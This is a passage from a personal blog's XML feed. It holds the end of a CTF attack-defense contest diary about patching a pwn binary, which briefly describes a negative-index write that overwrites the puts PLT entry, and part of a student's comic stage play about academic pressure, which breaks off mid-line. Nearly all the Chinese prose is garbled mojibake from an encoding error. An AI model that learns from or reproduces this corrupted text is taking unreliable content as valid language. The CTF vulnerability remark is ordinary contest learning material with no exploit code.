alt="image-20230612200535096"></p><p>Ê≤°ÊÉ≥Âà∞Ëøô‰∏™patchÊäòÁ£®‰∫ÜÊàëÂá†‰∏™Â∞èÊó∂</p><p>È¶ñÂÖàÔºåÊàëÁöÑpatchÊµÅÁ®ãÈùûÂ∏∏ÁöÑÂéüÂßãÔºåÂõ†‰∏∫linuxÊú¨Êâæ‰∏çÂà∞ÂêàÈÄÇÁöÑidaÔºåwinÊú¨ÊêûÂøòË£ÖwslÔºåÊàëÈÉΩÊòØÂú®winÊú¨‰∏äÁî®idaËøõË°åpatchÔºåÂÜçÁî®uÁõòÊã∑Âà∞linuxÊú¨‰∏äÈ™åËØÅ„ÄÇËøôÊ†∑Êìç‰ΩúuÁõòÂíåÊé•Âè£ÈÉΩÊå∫Á¥ØÁöÑÔºåBeethovenÂíåSparklÁöÑuÁõòÂ∞±ÊòØËøôÊ†∑Ë¢´Áé©ÂæóËØÜÂà´‰∏ç‰∫ÜÔºà</p><p>ÁÑ∂ÂêéÊàëÂèëÁé∞Ôºå‰∏çÁÆ°ÊàëÊÄé‰πàÊîπÔºåÊúÄÂêéËøêË°åÁöÑÊó∂ÂÄôÈÉΩ‰ºösegment fault„ÄÇÊàë‰ª•‰∏∫ÊòØÊàëÁöÑÈóÆÈ¢òÔºå‰∫éÊòØÂ∞ùËØï‰∫ÜÂêÑÁßçÊñπÊ≥ïÔºöÁõ¥Êé•call puts„ÄÅÁõ¥Êé•call my_write„ÄÅÊääputsÁöÑpltÂÜçË¶ÜÂÜôÂà∞Âéü‰ΩçÁΩÆÂÜçcallÔºàËøô‰∏™Êìç‰ΩúÂæàÈïøÔºåÈúÄË¶ÅjumpÂà∞en_frameÊÆµÔºâÔºåÁîöËá≥ÊàëËøòËØïËøáÂú®ÊØèÊ¨°Êõ¥ÊîπÂêéÈÉΩË∞ÉÁî®‰∏ÄÈÅçÂàùÂßãÂåñÂáΩÊï∞„ÄÅÊääÂàùÂßãÂåñÂáΩÊï∞ÊîæËøõwhileÂæ™ÁéØËøô‰∫õÁ¶ªË∞±Êìç‰ΩúÔºåÁªìÊûúÈÉΩÊòØÊÇ≤‰º§ÁöÑsegment fault„ÄÇ</p><p>ÊàëÊÄÄÁùÄÊ≤âÁóõÁöÑÂøÉÊÉÖÂÜ≥ÂÆöÁî®gdbË∑ë‰∏ÄÈÅçÔºåÁúãÁúãÈóÆÈ¢òÂú®Âì™Èáå„ÄÇ‰∫éÊòØÊàë‰∏ÄË∑ØËµ∞‰∏ãÂéªÔºåËµ∞Âà∞ÈÄâÈ°πÂõõÔºåÁúãÂà∞‰∏ÄË°åÁÜüÊÇâÁöÑÊ±áÁºñÔºöjmp 0x‚Ä¶‚Ä¶</p><p>ÊàëË∂ÖÔºåËøô‰∏çÊòØÊàëÂá†ËΩÆ‰πãÂâçÁöÑÁâàÊú¨ÂêóÔºÅÊàë‰ª•‰∏∫ÊòØÊàëÊìç‰ΩúÂ§±ËØØÊ≤°ÊúâÊã∑Ë¥ù‰∏äÔºå‰∫éÊòØÈáçÊñ∞Â∫îÁî®‰∫Ü‰∏ÄÈÅçpatchÔºåÈáçÊñ∞Êã∑ËøáÊù•ÔºåÁªìÊûú‰æùÊóßËÉΩÁúãÂà∞ÁÜüÊÇâÁöÑjmp</p><p>Ê≠§ÂâçÔºåÊàë‰∏ÄÁõ¥ÊòØ‰∏™ÂùöÂÆöÁöÑÊó†Á•ûËÆ∫ËÄÖ</p><p>ÊàëÁî®idaÂèàÂ∫îÁî®‰∫Ü‰∏Ä‰ªΩpatchÔºåÁÑ∂ÂêéÁî®idaÊâìÂºÄÔºåÊûú‰∏çÂÖ∂ÁÑ∂ÔºåËøòÊòØÊúâjmp</p><p>ÊàëÁöÑidaÁÉÇ‰∫ÜÔºÅ</p><p>Ôºà‰∏•Ê†ºÊù•ËØ¥ÔºåUÁõò‰πüÊòØÁÉÇÁöÑÔºåÂêéÈù¢ÊàëÂèëÁé∞ÊúâÊó∂ÊîπÂä®UÁõòÊñá‰ª∂ÔºåÊãîÊèíÂêéÁ´üÁÑ∂ÂèØ‰ª•ÊÅ¢Â§çÂ¶ÇÂàùÔºâ</p><p>ÊàëÊä¢Êù•BeethovenÁöÑÁîµËÑëÔºåÊîπ‰∫Ü‰∏§ÈÅçÂ∞±Â•Ω‰∫ÜÔºåcall my_writeÔºåÊ≤°Êúâsegment fault</p><p>ÂñúÈóª‰πêËßÅÁöÑÊòØÔºåÊàë‰ª¨‰∫§‰∏äÂéª‰πãÂêéÔºåÁªìÊûúÊòØËøôÊ†∑ÁöÑÔºö</p><p><img src="/../img/ciscn2023%E5%8D%8A%E5%86%B3%E8%B5%9B%E6%B8%B8%E8%AE%B0.assets/image-20230612203259477.png" alt="image-20230612203259477"></p><p>‰πêÔºåÊäòÁ£®‰∫ÜÊàë‰∏§‰∏™Â§öÂ∞èÊó∂ÁöÑÊ¥ûÔºåÊîπÂçäÂ§©ËøûÂÖ≥ÈîÆÁÇπÈÉΩÊ≤°ÊîπÂØπ</p><p>ÊàëÁõØÁùÄ‰ª£Á†ÅÁúã‰∫ÜÂçäÂ§©ÔºåÊ®™Á´ñÊ≤°ÁúãÂà∞Âà´ÁöÑÊ¥û„ÄÇ</p><p>Áõ¥Âà∞ÊØîËµõÁªìÊùüÂâç‰∫åÂçÅÂàÜÈíüÔºåÊàëËøòÊòØ‰∏çÁõ∏‰ø°ÔºåÊÄÄÁñëÊòØÊâìÂåÖÁöÑÈóÆÈ¢òÔºå‰∫éÊòØÂèàÊâì‰∫Ü‰∏ÄÈÅç„ÄÇÂáÜÂ§áÂÜçÊ¨°Êèê‰∫§Êó∂ÔºåÊàëÁúãÂà∞Êèê‰∫§Ë¶ÅÊ±ÇÔºöpatchËÑöÊú¨Â∫îÂëΩÂêç‰∏∫update.shÔºåÊàë‰∏ÄÁõ¥ÂÜôÁöÑÊòØover.sh</p><p>ÂìÑÂ†ÇÂ§ßÁ¨ë‰∫Ü</p><p>Ê®Ç</p><h2 id="over-getflag"><a href="#over-getflag" class="headerlink" title="over_getflag"></a>over_getflag</h2><p>Ê≤°ÂÅöÂá∫Êù•ÔºåËß£Ê≥ïÊòØshinoÊïôÁöÑ</p><p>Êàë‰∏ÄÁõ¥‰ª•‰∏∫ÈÇ£Âá†‰∏™‰øÆÊîπÊòØ‰ªÄ‰πàÈ´òÊ∑±ÁöÑÁÆóÊ≥ïÔºå‰∏ÄÂ∫¶ÂîÜ‰ΩøÂØÜÁ†ÅÂ≠¶Â§ßÂ∏àBeethovenËøõË°åÁ†¥Ëß£„ÄÇ‰ªñÂèëÁé∞v5Âπ∂Ê≤°ÊúâÁî®‰∏äÔºåÁÑ∂ÂêéÊàë‰ª¨Ê≠¢Ê≠•‰∫éÊ≠§„ÄÇ‰∫ãÂÆû‰∏äÔºåÊï¥‰∏™ÁÆóÊ≥ïÈÉΩÊòØÈöúÁúºÊ≥ïÔºåÁúüÊ≠£ÊúâÁî®ÁöÑÈÉ®ÂàÜÂè™ÊúâÔºöÂ∞Ü<code> *((_DWORD *)&amp;qword_4060 + v3 + 12)</code>ÁöÑÂÜÖÂÆπÂáèÂéªËØªÂÖ•ÁöÑ<code>my_read</code>ÔºåÂõ†‰∏∫v3ÂèØ‰ª•‰∏∫Ë¥üÔºåÂèØ‰ª•Áõ¥Êé•‰øÆÊîπÂ≠òÂÇ®puts_pltÂ§ÑÁöÑÂÜÖÂÆπ</p><p>ÂÆûÈôÖ‰∏äÊàëÊúÄÂ§ßÁöÑÈóÆÈ¢òÊòØÊää<code>qword_4060 += v4</code>ËøôÂè•ËØØ‰ª•‰∏∫ÊòØÂú∞ÂùÄ‰ºöÂä†‰∏äv4Ôºå‰∫éÊòØËÆ§‰∏∫v4‰ºöÂΩ±ÂìçÊúÄÂêé‰øÆÊîπÁöÑÂú∞ÂùÄ</p><p>ÊâÄË∞ìÈÄÜÂêë‰∏çËßÑËåÉÔºåÊâìpwn‰∏§Ë°åÊ≥™</p><hr><p>Ëµ∞ÁöÑÊó∂ÂÄôÂê¨ËßÅ‰∏Ä‰∏™ÊåáÂØºËÄÅÂ∏àÂú®Ë∑üÈòüÂëòËØ¥Ôºö‰Ω†‰πãÂâçÁöÑ‰Ωú‰∏öÂèàÊ≤°ÊúâËÆ§ÁúüÂÅöÂêßÔºå‰Ω†ÁúãËøôÊ¨°Âá∫ÂéüÈ¢ò‰∫ÜÂêß</p><h1 id="6-12"><a href="#6-12" class="headerlink" title="6.12"></a>6.12</h1><p>ËÆ°ÂàíÔºö‰∏äÂçàÈÄõ‰∫ëÂ§ß</p><p>Áé∞ÂÆûÔºö11Ôºö30Ë¢´ÁîµËØùÂè´ÈÜí</p><h1 id="ÊÄªÁªì"><a href="#ÊÄªÁªì" class="headerlink" title="ÊÄªÁªì"></a>ÊÄªÁªì</h1><p>‰∏ç‰ºöÂ†ÜÔºåÊàëÂ•ΩËèúÔºà‰Ω†‰ª•‰∏∫‰Ω†ËèúÂè™ÊòØÂõ†‰∏∫‰∏ç‰ºöÂ†ÜÂêóÔºâ</p><p>‰∏∫‰∫ÜÊâìpatchË°•‰∫Ü‰∏Ä‰∫õÊ±áÁºñÁü•ËØÜÔºåÂØπ‰∫é‰∏Ä‰∏™Âè™‰ºöf5ÁöÑpwnÊâãÂ∑≤ÁªèÂæàÈöæÂæó‰∫Ü</p><p>Â≠¶ÁÇπÈÄÜÂêëÂêß</p><p>CNSSÂ•ΩÂº∫</p><p>‰ªÄ‰πàÊó∂ÂÄôÊâçËÉΩÊúâÈí±Êç¢ÁîµËÑëÂïä</p><p>‰∫ëÂçóÁæéÂ•≥ÁúüÂ§ö</p>]]></content>
    
    
    <summary type="html">IDA‰Ω†ÁúüËØ•Ê≠ªÂïä</summary>
    
    
    
    <category term="misc" scheme="http://deepunk.icu/categories/misc/"/>
    
    
    <category term="PWN" scheme="http://deepunk.icu/tags/PWN/"/>
    
    <category term="awd" scheme="http://deepunk.icu/tags/awd/"/>
    
    <category term="Êë∏" scheme="http://deepunk.icu/tags/%E6%91%B8/"/>
    
  </entry>
  
  <entry>
    <title>ÊπçÊµÅ</title>
    <link href="http://deepunk.icu/%E6%B9%8D%E6%B5%81/"/>
    <id>http://deepunk.icu/%E6%B9%8D%E6%B5%81/</id>
    <published>2023-05-29T15:41:35.000Z</published>
    <updated>2023-12-09T07:11:23.576Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>Â§ß‰∏ÄÂ≠¶ÁîüÊäΩË±°ÂøÉÁêÜËØæ‰ΩúÂìÅ</p></blockquote><h1 id="Á¨¨‰∏ÄÂπïÔºåÂ§ñÊôØÔºöÊ≤≥Ê∞¥Ëæπ"><a href="#Á¨¨‰∏ÄÂπïÔºåÂ§ñÊôØÔºöÊ≤≥Ê∞¥Ëæπ" class="headerlink" title="Á¨¨‰∏ÄÂπïÔºåÂ§ñÊôØÔºöÊ≤≥Ê∞¥Ëæπ"></a>Á¨¨‰∏ÄÂπïÔºåÂ§ñÊôØÔºöÊ≤≥Ê∞¥Ëæπ</h1><p>‰∫∫Áâ©ÔºöÁ®ãÊôìÈùõ„ÄÅÁ®ãÊôìÈùõÔºàÂç∑Ôºâ„ÄÅÁ®ãÊôìÈùõÔºàÊëÜÔºâ„ÄÅÊ≤≥Á•û„ÄÅÂ≠¶Á•û„ÄÇ</p><p>ÔºàÁ®ãÊôìÈùõ‰∏äÔºâ</p><p>Á®ãÔºàÁã¨ÁôΩÔºâÔºöÁ®ãÊôìÈùõÂïäÁ®ãÊôìÈùõÔºå‰Ω†ËøΩÂØª18Âπ¥ÁöÑÁõÆÊ†áÔºåÂú®È´òËÄÉÂÆåÁöÑÂ§úÊôöÁ´üÁÑ∂Âá≠Á©∫Ê∂àÂ§±‰∫Ü„ÄÇ‰Ω†‰ª•‰∏∫‰Ω†‰ºöÂú®Êñ∞ÁöÑÊ†°Âõ≠ÊâæÂà∞Êñ∞ÁöÑÊñπÂêëÔºåÂëµÔºåËøô‰∏â‰∏™ÊúàÂè™ËÆ©‰Ω†ÂèòÂæóÊõ¥Âä†Ëø∑Ëå´„ÄÇ</p><p>Âç∑ÔºöÂêÑÂºèÂêÑÊ†∑ÁöÑ‰∫∫ÔºåÂêÑÂºèÂêÑÊ†∑ÁöÑÊπçÊµÅ„ÄÇ</p><p>ÊëÜÔºö‰Ω†Âè™ÊòØ‰∏ÄÁâáÂú®‰ªñ‰ª¨‰πãÈó¥ÊôïÂ§¥ËΩ¨ÂêëÁöÑËêΩÂè∂„ÄÇ</p><p>Âç∑ÔºöÂøôÁ¢åÂç¥‰∏çÁü•ÈÅìÊâÄÂÅö‰∏∫‰Ωï„ÄÇ</p><p>ÊëÜÔºàÊàèË∞ëÔºâÔºöÂ•ΩÂÉè‰∏ÄÊù°ÁãóÂïä„ÄÇ</p><p>ÔºàÁ®ãÊëÜÊëÜÂ§¥ÔºåÁÉ¶Ë∫ÅÂú∞Ëµ∞Âà∞Ê≤≥ËæπÁöÑÂõ¥Ê†èÂ§ÑÔºåÈù†‰∫Ü‰∏äÂéªÔºâ</p><p>ÔºàÊ≤≥Á•ûË∫´ÁùÄË•øË£ÖÔºåÂú®‰ªñË∫´ÂêéÂá≠Á©∫Âá∫Áé∞Ôºâ</p><p>Ê≤≥ÔºöÂà´Ë∑≥ÂïäÂ∞è‰ºôÂ≠êÔºåÊúâ‰∫ãÈÉΩÂèØ‰ª•ÂêëÈ¢ÜÂØºÂèçÊò†„ÄÇ</p><p>Á®ãÔºöË∞ÅË¶ÅË∑≥‰∫ÜÔºüÊàëÂú®ËßÇÂØüËøôÂè™ÈªëÂ§©ÈπÖÁöÑÂΩ¢‰ΩìÁæé„ÄÇ</p><p>Ê≤≥ÔºöË∑ü‰Ω†ÂºÄÁé©Á¨ëÁöÑÔºåÊàëÊòØÊ≤≥Á•ûÔºåÂΩìÁÑ∂Áü•ÈÅì‰Ω†Âú®ÊÉ≥‰ªÄ‰πà„ÄÇ</p><p>Á®ãÔºöÊ≤°ËßÅËøáÊ≤≥Á•ûÁ©øË•øË£ÖÁöÑ„ÄÇ</p><p>Ê≤≥ÔºöËøô‰∏çÊèêÂçáÂìÅÁâåÂΩ¢Ë±°Âòõ„ÄÇ</p><p>ÔºàËØ¥ÁùÄËµ∞ÂêëÊ≤≥ËæπÔºåÈù¢ÊúùÂ§ßÊ≤≥ÔºåËÉåË∫´‰æßÂØπÁùÄÁ®ãÊôìÈùõÔºâ</p><p>Ê≤≥ÔºöÊàëÂú®ËøôÈáåÂ∑•‰Ωú‰∫ÜÂÖ≠ÂçÅÂπ¥ÔºåËßÅËøáÂ§™Â§ö‰Ω†ËøôÊ†∑ÁöÑÂ≠¶Áîü„ÄÇÔºàÁ™ÅÁÑ∂ÊÑüÊÖ®ÔºâÂèØËÉΩËø∑Ëå´ÊâçÊòØÈùíÊò•ÁöÑÂ∏∏ÊÄÅÔºåÊ≠•‰ºêÂùöÂÆöÈÉΩÊòØÊÑèÊñô‰πãÂ§ñ„ÄÇ</p><p>ÊëÜÔºàÁ™ÉÁ™ÉÁßÅËØ≠ÔºâÔºö‰ªñË∞ÅÂïäÔºü</p><p>Âç∑ÔºöÂçñ‰øùÈô©ÁöÑËÆ©ËøõÂ≠¶Ê†°‰∫ÜÔºü</p><p>Ê≤≥ÔºàÊ∏ÖÊ∏ÖÂóìÂ≠êË£Ö‰ΩúÊ≤°Âê¨ËßÅÔºâÔºöÊàë‰ª¨ÂÜ≥ÂÆöÁªôËøôÊ†∑ÁöÑÂ≠¶Áîü‰∏Ä‰∏™Êú∫‰ºöÔºå‰∏Ä‰∏™ËÆ©‰ªñ‰ª¨ÊâæÂà∞Ëá™Â∑±ÊñπÂêëÁöÑÊú∫‰ºö„ÄÇÔºàËΩ¨Ë∫´‰∏•ËÇÉÂú∞ÁúãÂêëÁ®ãÔºâÂ¶ÇÊûú‰Ω†ËÉΩÊåâÂà´‰∫∫ÁöÑ‰∫∫ÁîüËΩ®ËøπÁîüÊ¥ªÔºå‰Ω†ÊúÄÊÉ≥Êàê‰∏∫Ë∞ÅÔºü</p><p>Á®ãÔºöÂïäÔºàËøüÁñëÔºâÊàê‰∏∫Âà´‰∫∫Ôºü</p><p>Ê≤≥ÔºöÂà´ËØØ‰ºöÔºå‰Ω†ËøòÊòØ‰Ω†ÔºåÂè™ÊòØ‰Ω†ÁöÑÁõÆÊ†á„ÄÅÁîüÊ¥ªËΩ®Ëøπ‰ºöÈöè‰πãÊîπÂèò„ÄÇ</p><p>ÊëÜÔºöÂê¨Ëµ∑Êù•‰∏çÈîôÔºåÁúÅÂæóÂú®Ëø∑Ëå´‰∏≠Êµ™Ë¥πÂõõÂπ¥„ÄÇ</p><p>Âç∑ÔºàÊÄùÁ¥¢ÔºâÔºöÂí±Â≠¶Ê†°‰ªäÂπ¥‰∏çÊòØÊúâ‰∏™‰øùÁ†îÊ∏ÖÂçéÁöÑÂ≠¶ÈïøÂêóÔºåÂúàÈáåÈÉΩÂè´‰ªñÁ•û‰ªô„ÄÇ</p><p>ÔºàÂºÄÂßãÊèíÂÖ•Â≠¶Á•ûÁöÑÁâáÊÆµÔºåÂç∑‰∏∫ÊóÅÁôΩÔºâ</p><p>Âç∑ÔºöÊçÆËØ¥‰ªñËÄÉËØï‰ªéÊù•Ê≤°Êúâ‰ΩéËøá99ÂàÜÔºàÂÜÖÊôØÔºåÂÆøËàçÔºåÂ≠¶Á•ûÂú®Â≠¶‰π†ÔºåÊúâ‰∫∫ÈÄíÊù•‰∏ÄÂº†100ËØïÂç∑ÔºåÂ≠¶Á•ûÈöèÊâãÂæÄÂ∫üÁ∫∏ÁØì‰∏ÄÊâîÔºåÈïúÂ§¥ÂàáÂà∞Â∫üÁ∫∏ÁØìÔºåÈáåÈù¢ÂÖ®ÊòØÊª°ÂàÜËØïÂç∑Ôºâ</p><p>Âç∑ÔºöÁ´ûËµõÂ§ßÂ•ñÊãøÂà∞ÊâãÊäΩÁ≠ãÔºàÂÜÖÊôØÔºåËá™‰π†ÂÆ§ÔºåÂ≠¶Á•ûÊãøÁùÄ‰∏ÄÂº†Â•ñÁä∂ÔºåÊâãÂºÄÂßãÊäΩÁ≠ãÔºâ</p><p>Âç∑Ôºö‰∫éÊòØÈ°∫ÁêÜÊàêÁ´†Âú∞Êàê‰∏∫‰∫Ü‰øùÁ†îÊ∏ÖÂçéÁöÑÊúÄ‰Ω≥‰∫∫ÈÄâÔºàÂ≠¶ÈïøÂú®Ê∏ÖÂçéÈó®ÂâçÊãçÁÖßÔºåÊ≠§Â§ÑÁöÑÊ∏ÖÂçéÈó®ÂèØ‰ª•p‰∏äÂéªÔºåÊàñËÄÖÂú®Â§ßÂ±èÂπï‰∏äÊäï‰∏Ä‰∏™Ê∏ÖÂçéÈó®ÁöÑËÉåÊôØÔºâ</p><p>ÔºàÂπªÊÉ≥Êó∂Èó¥ÁªìÊùüÔºåÂõûÂà∞ÂéüÊù•ÁöÑÂú∫ÊôØÔºâ</p><p>Á®ãÔºàÁÇπÁÇπÂ§¥ÔºâÔºöÊàëÊÉ≥Êàê‰∏∫‰ªñ„ÄÇ</p><p>Ê≤≥ÔºàÂæÆÁ¨ëÔºâÔºöÈÇ£‰Ω†Èó≠‰∏äÁúºÁùõ„ÄÇ</p><p>Á®ãÈó≠ÁúºÔºåÊ≤≥ÊéèÂá∫‰∏ÄÁ≤íÁ∫¢Ëâ≤ËçØ‰∏∏ÔºåÁ≤óÈ≤ÅÂú∞Â°ûËøõÁ®ãÊôìÈùõÂò¥ÈáåÔºåÁ®ãËØïÂõæÊå£Êâé„ÄÇ</p><p>ÁîªÈù¢‰∏ÄÈªë„ÄÇ</p><p>Ê≤≥ÁöÑÂ£∞Èü≥Ôºö‰ΩÜÊòØÔºåÂè§Â∞î‰∏πÔºå‰ª£‰ª∑ÊòØ‰ªÄ‰πàÂë¢Ôºü</p><h1 id="Á¨¨‰∫åÂπïÔºåÂÜÖÊôØÔºöËá™‰π†ÂÆ§"><a href="#Á¨¨‰∫åÂπïÔºåÂÜÖÊôØÔºöËá™‰π†ÂÆ§" class="headerlink" title="Á¨¨‰∫åÂπïÔºåÂÜÖÊôØÔºöËá™‰π†ÂÆ§"></a>Á¨¨‰∫åÂπïÔºåÂÜÖÊôØÔºöËá™‰π†ÂÆ§</h1><p>‰∫∫Áâ©ÔºöÁ®ãÊôìÈùõÔºåÂç∑ÔºåÊëÜÔºåÂ•öÂΩ©ÔºàÂ•≥ÊúãÂèãÔºâÔºåÂÆ§ÂèãËÄÅÁéã</p><p>Á®ãÊôìÈùõË∂¥Âú®Ê°åÂ≠ê‰∏äÁù°ËßâÔºåÁ™ÅÁÑ∂ÊÉäÈÜí</p><p>Á®ãÔºöÊàëÊòØË∞ÅÔºåÊàëÂú®Âì™ÔºåÊàëÂú®Âπ≤‰ªÄ‰πàÔºü</p><p>Âç∑Ôºö‰Ω†ÊòØÂç∑ÁéãÔºå‰Ω†Âú®Ëá™‰π†ÂÆ§Ôºå‰Ω†Âú®‰∏∫‰∏≠Âçé‰πãÂ¥õËµ∑ËÄåËØª‰π¶„ÄÇ</p><p>ÊëÜÔºöÂ∑Æ‰∏çÂ§öÂæó‰∫ÜÔºåËøôÊâçÂÖ≠ÁÇπËøáÔºå‰Ω†ÂÅèË¶ÅË∑ëÊù•ËÉå‰ªÄ‰πàÂçïËØçÔºåÂÅöÁªôË∞ÅÁúãÂë¢„ÄÇ</p><p>Á®ãÁ™ÅÁÑ∂ÊÉäËÆ∂Âú∞ÂèëÁé∞ÁúºÂâçÊúâ‰∏ÄÊú¨ÁøªÂºÄÁöÑÂçïËØç‰π¶„ÄÇ</p><p>ÊëÜÔºöËÆ©ÊàëÁúãÁúãÂ∏¶Â≠¶Èú∏ËÉåÂ§öÂ∞ë‰∫Ü‚Ä¶‚Ä¶ÔºàÊä¢ËøáÂçïËØç‰π¶ÔºâÔºàÈÉëÈáçÂÖ∂‰∫ãÂú∞È•±Âê´ÊÑüÊÉÖÂú∞Â§ßÂ£∞ÊúóËØªÔºâAÔºåAbandonÔºåÊîæÂºÉ„ÄÇ</p><p>Âç∑ÔºàÊÑ§ÊÄíÂú∞ÔºâÔºöÂìéÂë¶‰Ω†Âπ≤ÂòõÔºàÊä¢ËøáÂçïËØç‰π¶ÁªôÁ®ãÔºâÔºå‰∫∫ÁöÑËΩ¨ÂèòÊÄªÊòØË¶ÅÁÇπÊó∂Èó¥ÈÄÇÂ∫î„ÄÇÂÉè‰Ω†ËøôÊ†∑ÊÄ•ÂäüËøëÂà©Ôºå‰ªÄ‰πà‰∫ã‰πüÂÅö‰∏çÊàê„ÄÇÔºàËΩ¨Â§¥ÁúãÂêëÁ®ãÔºåÊ∏©ÊüîËÄåÂùöÂÆöÂú∞ÔºâÊàë‰ª¨‰∏ÄËµ∑Ôºå‰∏∫‰∫ÜÊ¢¶ÊÉ≥Â•ãÊñóÂêß„ÄÇ</p><p>Á®ãÁÇπÁÇπÂ§¥ÔºåÁúº‰∏≠ÊúâÂ∏åÊúõÁöÑÂÖâ„ÄÇ</p><h2 id="2-1-ÂÜÖÊôØÔºåËá™‰π†ÂÆ§"><a href="#2-1-ÂÜÖÊôØÔºåËá™‰π†ÂÆ§" class="headerlink" title="2-1 ÂÜÖÊôØÔºåËá™‰π†ÂÆ§"></a>2-1 ÂÜÖÊôØÔºåËá™‰π†ÂÆ§</h2><p>ÈïúÂ§¥Ê≠£ÂØπÂ≠¶‰π†‰∏≠ÁöÑÁ®ãÔºåÂÄçÈÄüÊí≠ÊîæÁ®ãÂ≠¶‰π†ÁöÑ‰∏ÄÂ§©ÔºåÂÖâÁ∫øÁî±ÊöóÂà∞ÊòéÂÜçÂà∞ÊöóÔºåÊ°åÂ≠ê‰∏äÂ†ÜÁßØÁöÑ‰π¶‰∏ÄÂ†ÜÊÖ¢ÊÖ¢ÂáèÂ∞ëÔºåÂè¶‰∏ÄÂ†ÜÊÖ¢ÊÖ¢Â¢ûÂ§öÔºå‰ªñÁöÑË∫´Âêé‰∫∫Êù•‰∫∫ÂæÄ„ÄÇÁ®ã‰∏ÄÁõ¥ÂüãÂ§¥Ëã¶Â≠¶„ÄÇ</p><p>Êôö‰∏äÔºåÂ•öÂ∞èÂΩ©ÈùôÈùôÊù•Âà∞‰ªñË∫´ËæπÔºåÊãç‰∫ÜÊãç‰ªñ</p><p>Á®ãÊÉäÔºöÂ•öÂ∞èÂΩ©Ôºü</p><p>Â•öÂ∞èÂΩ©ÂæÆÁ¨ëÁùÄÁ§∫ÊÑèÂíåÂ•π‰∏ÄËµ∑Âá∫Âéª„ÄÇ</p><p>Á®ãÊó†Â•àÂú∞Êëá‰∫ÜÊëáÂ§¥ÔºåÊåá‰∫ÜÊåáÂ†ÜÁßØÁöÑ‰π¶Á±ç„ÄÇ</p><p>Â•öÂ∞èÂΩ©Ëã¶Á¨ë„ÄÇ</p><h2 id="2-2-Â§ñÊôØÔºå‰ΩìËÇ≤Âú∫ËæπÁöÑÈÅìË∑Ø‰∏ä"><a href="#2-2-Â§ñÊôØÔºå‰ΩìËÇ≤Âú∫ËæπÁöÑÈÅìË∑Ø‰∏ä" class="headerlink" title="2-2 Â§ñÊôØÔºå‰ΩìËÇ≤Âú∫ËæπÁöÑÈÅìË∑Ø‰∏ä"></a>2-2 Â§ñÊôØÔºå‰ΩìËÇ≤Âú∫ËæπÁöÑÈÅìË∑Ø‰∏ä</h2><p>Á®ã‰∏æÁùÄÊâãÊú∫ÊÖ¢Ë∑ëÔºåÈïúÂ§¥ËøéÁùÄÁ®ãÔºå‰øùÊåÅÁ®ãÂú®ÁîªÈù¢‰∏≠ÂøÉ„ÄÇ</p><p>ÊóÅËæπËµ∞Êù•‰∏Ä‰∏™ÊãøÁùÄÁØÆÁêÉÁöÑÂÖÑÂºüÊãõÂëº‰ªñÊâìÁØÆÁêÉÔºåÁ®ãÊëÜÊëÜÊâãÔºå‰∏æËµ∑Êâã‰∏≠ÁöÑ‰πêÂÅ•Á§∫ÊÑè</p><p>ÊóÅËæπËµ∞Êù•‰∏Ä‰∏™ÊãøÁùÄ‰πí‰πìÁêÉÊãçÁöÑÂÖÑÂºüÊãõÂëº‰ªñÊâì‰πí‰πìÁêÉÔºåÁ®ãÊëÜÊëÜÊâãÔºå‰∏æËµ∑Êâã‰∏≠ÁöÑ‰πêÂÅ•Á§∫ÊÑè</p><p>ÊóÅËæπËµ∞Êù•‰∏Ä‰∏™ÊãøÁùÄÁæΩÊØõÁêÉÊãçÁöÑÂÖÑÂºüÊãõÂëº‰ªñÊâìÁæΩÊØõÁêÉÔºåÁ®ãÊëÜÊëÜÊâãÔºå‰∏æËµ∑Êâã‰∏≠ÁöÑ‰πêÂÅ•Á§∫ÊÑè</p><h2 id="2-3-Â§ñÊôØÔºåÂ§úÊôöÔºåÈïøÊ§Ö‰∏ä"><a href="#2-3-Â§ñÊôØÔºåÂ§úÊôöÔºåÈïøÊ§Ö‰∏ä" class="headerlink" title="2-3 Â§ñÊôØÔºåÂ§úÊôöÔºåÈïøÊ§Ö‰∏ä"></a>2-3 Â§ñÊôØÔºåÂ§úÊôöÔºåÈïøÊ§Ö‰∏ä</h2><p>Á®ãÊãøÁùÄËØæÊú¨Êª°ÊÄÄÊÑüÊÉÖÂú∞Â§ßÂ£∞ÊúóËØªÔºöwhere there is a willÔºåthere is a way</p><p>Á™ÅÁÑ∂ÊâãÊú∫Âìç‰∫ÜÔºåÂ•öÂΩ©ÂèëÊù•‰∏ÄÊù°ÂæÆ‰ø°ÔºöÊàë‰∏çÊÉ≥ËÄΩËØØ‰Ω†   Â∞±ËøôÊ†∑Âêß„ÄÇ</p><p>Á®ãÁúãÂêëÂ§©Á©∫ÔºåÈªëÊöó‰∏≠Áúã‰∏çÊ∏Ö‰ªñÁöÑËÑ∏„ÄÇ</p><h2 id="2-4-ÂÜÖÊôØÔºåÂÆøËàçÈáåÔºåÊ∏ÖÊô®"><a href="#2-4-ÂÜÖÊôØÔºåÂÆøËàçÈáåÔºåÊ∏ÖÊô®" class="headerlink" title="2-4 ÂÜÖÊôØÔºåÂÆøËàçÈáåÔºåÊ∏ÖÊô®"></a>2-4 ÂÜÖÊôØÔºåÂÆøËàçÈáåÔºåÊ∏ÖÊô®</h2><p>ÈïúÂ§¥ËêΩÂú®Êó•ÂéÜ‰∏äÔºåÂúàÂá∫‰∫Ü‰øùÁ†îÁªìÊûúÂÖ¨Â∏ÉÁöÑÊó•ÊúüÔºåÊ≠£ÊòØ‰ªäÂ§©„ÄÇ</p><p>Á®ãÈÜíÊù•ÔºåÂèëÁé∞ÊâãÊú∫ÈÇÆÁÆ±ÈáåÊî∂Âà∞‰∫ÜÊ∏ÖÂçéÂ§ßÂ≠¶ÁöÑoffer„ÄÇ</p><p>‰ªñÊÉäÂñúÂú∞Ê¨¢ÂëºÔºå‰ªñË∑É‰∏ãÂ∫äÔºöËäúÊπñÔºÅÂÖÑÂºü‰ª¨ÔºÅÊàëË¶Å‰∏äÊ∏ÖÂçé‰∫ÜÔºÅ</p><p>ÂèØÊòØÊ≤°Êúâ‰∫∫ÂõûÂ∫î</p><p>ÈïúÂ§¥Êâ´ËøáÂØùÂÆ§Ôºå‰∏§‰∏™ÂÆ§ÂèãÈÉΩ‰∏çÂú®ÔºåÂâ©‰∏ãÁöÑ‰∏Ä‰∏™Êà¥ÁùÄËÄ≥Êú∫Âú®ÊâìÊ∏∏Êàè„ÄÇ</p><p>Á®ãÊãçÊãçÂÆ§ÂèãÁöÑËÇ©ÔºåÂÆ§ÂèãÊëò‰∏ãËÄ≥Êú∫ÂõûÂ§¥ÔºåÁÑ∂ÂêéÂõûÂ§¥ÁªßÁª≠ÊâìÊ∏∏ÊàèÔºåÁ®